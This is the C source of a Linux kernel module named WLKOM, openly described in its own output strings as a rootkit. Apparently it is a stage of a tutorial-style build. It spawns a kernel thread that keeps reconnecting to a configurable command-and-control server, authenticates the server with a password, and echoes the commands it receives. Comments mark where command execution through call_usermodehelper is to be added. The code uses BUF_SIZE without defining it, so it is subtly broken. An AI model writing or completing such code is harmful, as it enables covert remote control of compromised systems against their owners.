#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <net/sock.h>
#include <linux/types.h> // [ADDED] For bool type support

#define RETRY_DELAY 5

static char *password = "";
static char *c2_ip    = "192.168.100.10";
static int   c2_port  = 4444;
module_param(password, charp, 0400);
module_param(c2_ip,    charp, 0400);
module_param(c2_port,  int,   0400);
MODULE_PARM_DESC(password, "Access password (required at insmod)");
MODULE_PARM_DESC(c2_ip,    "C2 server IPv4 address");
MODULE_PARM_DESC(c2_port,  "C2 server TCP port");

static struct task_struct *conn_thread = NULL;
static struct socket      *conn_sock   = NULL;

/* avoids -Wincompatible-pointer-types with struct sockaddr_unsized on 6.x */
static void *to_sockaddr(void *ptr) { return ptr; }

static int do_connect(void)
{
    struct sockaddr_in addr = { 0 };
    unsigned char ip_bin[4] = { 0 };
    int ret;

    if (in4_pton(c2_ip, -1, ip_bin, -1, NULL) == 0) {
        pr_err("wlkom: invalid C2 IP address: %s\n", c2_ip);
        return -EINVAL;
    }

    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_sock);
    if (ret < 0) {
        pr_err("wlkom: sock_create failed: %d\n", ret);
        return ret;
    }

    addr.sin_family = AF_INET;
    addr.sin_port   = htons(c2_port);
    memcpy(&addr.sin_addr.s_addr, ip_bin, sizeof(addr.sin_addr.s_addr));

    ret = conn_sock->ops->connect(conn_sock, to_sockaddr(&addr),
                                  sizeof(addr), 0);
    if (ret < 0) {
        sock_release(conn_sock);
        conn_sock = NULL;
        return ret;
    }

    return 0;
}

static int connection_thread(void *data)
{
    struct msghdr msg = { 0 };
    struct kvec   vec = { 0 };
    char buf[256];
    int   ret;

    while (!kthread_should_stop()) {
        ret = do_connect();
        if (ret < 0) {
            pr_err("wlkom: C2 unreachable (%d), retry in %ds\n",
                   ret, RETRY_DELAY);
            schedule_timeout_interruptible(HZ * RETRY_DELAY);
            continue;
        }

        pr_info("wlkom: connected to C2 %s:%d\n", c2_ip, c2_port);

        /* * [ADDED] CHANNELS SECURITY & PARSING 
         * Track authentication state before processing commands.
         */
        bool authenticated = false;

        while (!kthread_should_stop()) {
            memset(buf, 0, sizeof(buf));
            vec.iov_base = buf;
            vec.iov_len  = sizeof(buf) - 1;
            ret = kernel_recvmsg(conn_sock, &msg, &vec, 1, vec.iov_len, 0);
            if (ret == 0 || ret < 0)
                break;

            // Strip newline characters for clean string comparison
            buf[strcspn(buf, "\r\n")] = 0;

            /* [ADDED] Phase 1: Handle network authentication (Section 7.8) */
            if (!authenticated) {
                if (strncmp(buf, "AUTH ", 5) == 0) {
                    char *provided_pass = buf + 5;
                    // Compare against the insmod variable configuration
                    if (strcmp(provided_pass, password) == 0) {
                        authenticated = true;
                        
                        // Send success confirmation back to the C2
                        struct msghdr send_msg = { 0 };
                        struct kvec send_vec = { 0 };
                        char *ok_payload = "AUTH_OK\n";
                        
                        send_vec.iov_base = ok_payload;
                        send_vec.iov_len  = strlen(ok_payload);
                        kernel_sendmsg(conn_sock, &send_msg, &send_vec, 1, send_vec.iov_len, 0);
                        continue;
                    }
                }
                // Disconnect if unauthorized or unexpected payload received
                pr_err("wlkom: Network authentication failed. Dropping connection.\n");
                break; 
            }

            /* * [ADDED] Phase 2: Processing Commands (Section 7.9 Skeleton) 
             * Temporary execution echo to confirm transmission channel functionality.
             * Safe hook location for call_usermodehelper implementation.
             */
            struct msghdr reply_msg = { 0 };
            struct kvec reply_vec = { 0 };
            char echo_buf[BUF_SIZE + 32];
            
            snprintf(echo_buf, sizeof(echo_buf), "[Rootkit received]: %s\n", buf);
            reply_vec.iov_base = echo_buf;
            reply_vec.iov_len  = strlen(echo_buf);
            kernel_sendmsg(conn_sock, &reply_msg, &reply_vec, 1, reply_vec.iov_len, 0);
        }

        kernel_sock_shutdown(conn_sock, SHUT_RDWR);
        sock_release(conn_sock);
        conn_sock = NULL;
        pr_info("wlkom: disconnected from C2, retrying\n");
    }

    return 0;
}

static int __init wlkom_init(void)
{
    if (!password || password[0] == '\0') {
        pr_err("wlkom: password required (insmod wlkom.ko password=...)\n");
        return -EINVAL;
    }

    pr_info("wlkom: loaded\n");

    conn_thread = kthread_run(connection_thread, NULL, "wlkom_conn");
    if (IS_ERR(conn_thread)) {
        pr_err("wlkom: failed to create connection thread\n");
        conn_thread = NULL;
        return -ENOMEM;
    }

    return 0;
}

static void __exit wlkom_exit(void)
{
    /* shutdown unblocks kernel_recvmsg before kthread_stop waits */
    if (conn_sock)
        kernel_sock_shutdown(conn_sock, SHUT_RDWR);

    if (conn_thread)
        kthread_stop(conn_thread);

    if (conn_sock) {
        sock_release(conn_sock);
        conn_sock = NULL;
    }

    pr_info("wlkom: unloaded\n");
}

module_init(wlkom_init);
module_exit(wlkom_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("WLKOM - Wild Linux Kernel Object Module");
MODULE_AUTHOR("NMT");